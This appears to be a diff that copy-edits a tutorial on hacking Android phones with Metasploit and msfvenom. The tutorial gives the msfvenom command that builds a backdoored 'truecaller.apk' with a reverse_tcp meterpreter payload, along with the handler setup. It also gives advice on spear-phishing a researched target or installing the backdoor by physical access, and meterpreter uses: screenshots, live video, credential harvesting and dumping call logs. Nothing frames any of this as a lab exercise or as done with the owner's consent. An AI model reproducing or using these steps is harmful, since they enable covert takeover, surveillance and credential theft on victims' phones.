@@ -1,6 +1,7 @@
-You have probably heard about the most famous hacking framework called Metasploit. This framework is one of the most used pentesting frameworks which by default is included in Kali Linux.
 
-All the professional hackers recommend Metasploit as their ideal tool for hacking and exploitation of android phones as well and windows devices.
+You have probably heard about the most famous hacking framework called Metasploit. This framework is one of the most used pentesting frameworks, which by default is included in Kali Linux.
+
+All the professional hackers recommend Metasploit as their ideal tool for hacking and exploitation of android phones as well and Windows devices.
 
 It also has plenty of modules for hacking IOS. The Metasploit and msfvenom are regarded as the best combination for hacking android devices
 -------------------------------------------------------------------------------------------------
@@ -10,20 +11,20 @@ Steps :
 #sudo msfconsole
 #msf6 > use exploit/multi/handler            //select the exploit
 #msf6 exploit(multi/handler) > set payload android/meterpreter/reverse_tcp             //selecting the payload
-#ifconfig to get the ip addr    
+#ifconfig to get the IP addr    
 #set LHOST IPadd
 #exploit
 
 Step 1: Create the attack
--sudo msfvenon -p android/meterpreter/reverse_tcp LHOST=IP LPORT=ANYPORT R> truecaller.apk  "One line command to create a apk file with a backdoor in it"
--once created study the target and plan the attack according to it
+-sudo msfvenon -p android/meterpreter/reverse_tcp LHOST=IP LPORT=ANYPORT R> truecaller.apk  "One line command to create an APK file with a backdoor in it"
+-once created, study the target and plan the attack according to it
 
-Step2: Seting up the environment for Hacking the android phone
--in my case i know my target will use gmail but direct gmail is not possible to send so am using smah to upload the file and sharing it as a link in gmail
--craft the mail according to the target reconn study if target like flowers send a pic of flower and buy more to click link and send it
+Step2: Setting up the environment for Hacking the android phone
+-in my case I know my target will use Gmail but direct Gmail is not possible to send, so I am using smash to upload the file and sharing it as a link in Gmail
+-craft the mail according to the target recon study if target like flowers send a pic of flower and buy more to click link and send it
 -sudo msfconsole "Open metasploit"
 -msf6 > use exploit/multi/handler "Select the exploit"
--"show options" to find the option we'll use the wilcard one 
+-"show options" to find the option, we'll use the wildcard one 
 -msf6 exploit(multi/handler) > set payload android/meterpreter/reverse_tcp "Payload selection"
 -ifconfig "To find the local IP
 -set LHOST IP "Give your local IP"
@@ -31,25 +32,25 @@ Step2: Seting up the environment for Hacking the android phone
 -run "Run the exploit"
 
 Step3: hacking the target
--do a small reconn study on the target and share the clicking options that can be used by target mostly email or sms
--Efficient methoda is to a spear phishing attacking or phisical access and install this as back door
--once the target opens the link it'll download a .apk file once it's insatlled the exploit is activated
+-do a small recon study on the target and share the clicking options that can be used by target, mostly email or SMS
+-Efficient method is to a spear phishing attacking or physical access and install this as back door
+-once the target opens the link it'll download a .APK file once it's installed the exploit is activated
 -sessions "to find the active session"
--type help in meterpreter you can see all the attack opention
+-type help in meterpreter you can see all the attack option
 -screenshot is the command used for taking screenshot on live 
--You can do live video, send file, download the file, play a audio on target pc, harvest  the credentials you got limit less controll over the target
--my case am taking the call history using dump_calllog, cheking the root and seeing all the installed hack
--Your hacking starts here one method keep following ill show you more efficient method in future.
+-You can do live video, send file, download the file, play an audio on target PC, harvest  the credentials you got limit less control over the target
+-my case I am taking the call history using dump_calllog, checking the root and seeing all the installed hack
+-Your hacking starts here one method, keep following, ill show you more efficient method in future.
 -------------------------------------------------------------------------------------------------
 
 What is msfvenom?
-Msfvenom is an android hacking framework used for making hacking apk files that have embedded reverse shells which can be used for hacking android devices.
+Msfvenom is an android hacking framework used for making hacking APK files that have embedded reverse shells which can be used for hacking android devices.
 
-This tool was not present in backtrack but is now present in Kali Linux as a separate option to make android hacking as easy as possible. We will be using Metasploit and msfvenom together for this hack.
+This tool was not present in backtrack, but is now present in Kali Linux as a separate option to make android hacking as easy as possible. We will be using Metasploit and msfvenom together for this hack.
 -------------------------------------------------------------------------------------------------
 
 So why is Metasploit so great?
-Metasploit built by rapid7 is a community-based project. It has numerous exploits and hacks made and optimized by the community. The best part is that it is free. To show how effective it is, so lets hack an android device with Metasploit and msfvenom
+Metasploit built by rapid7 is a community-based project. It has numerous exploits and hacks made and optimized by the community. The best part is that it is free. To show how effective it is, so let's hack an android device with Metasploit and msfvenom
 
 METASPLOIT AND MSFVENOM
 When it comes to hacking Android phones, there are lots of ways for doing so. There are apps, web portals, scripts, and whatnot. We have already seen how to hack an android device with a spy note.
@@ -58,5 +59,4 @@ So today we are going to guide you on how to hack android phone using Metasploit
 
 For performing this hack using Metasploit or msfvenom, you’ll need Kali Linux OS installed on your computer and Android Phone as a target. And obviously, an internet connection is a must.
 
-Below are the steps to perform this hack using Metasploit or msfvenom. So let’s start hacking.
-
+above are the steps to perform this hack using Metasploit or msfvenom. So let’s start hacking.
